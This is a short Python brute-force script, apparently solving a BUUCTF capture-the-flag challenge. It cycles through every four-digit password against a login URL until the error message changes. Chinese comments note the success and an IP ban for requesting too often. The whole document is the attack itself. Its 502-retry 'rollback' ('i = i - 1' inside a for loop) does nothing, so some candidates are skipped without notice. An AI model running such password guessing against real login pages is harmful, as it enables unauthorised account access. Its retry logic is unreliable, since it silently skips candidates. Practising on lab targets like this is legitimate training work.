"""
爆破成功...
【封ip】爬虫太频繁, chatgpt使用都会遇到封ip的。。。
"""
import time
import requests
import threading
import concurrent.futures
from typing import List, Tuple

def fuzz():
    url = "http://0d345a0d-f773-4be5-ab4b-0adbce1cca25.node4.buuoj.cn:81?username=admin&password="

    for i in range(1000, 10000): # 从1000到9999
        res = requests.get(url + str(i))
        print("[*] 尝试: ", str(i))
        if "502" in str(res.status_code): # 502, 服务器端错误。。。
            time.sleep(0.5)
            i = i - 1 # rollback to continue next...
            continue
        if res.text != "密码错误，为四位数字。":
            print("爆破成功")
            print(res.text) 
            break

if __name__ == "__main__":
    fuzz()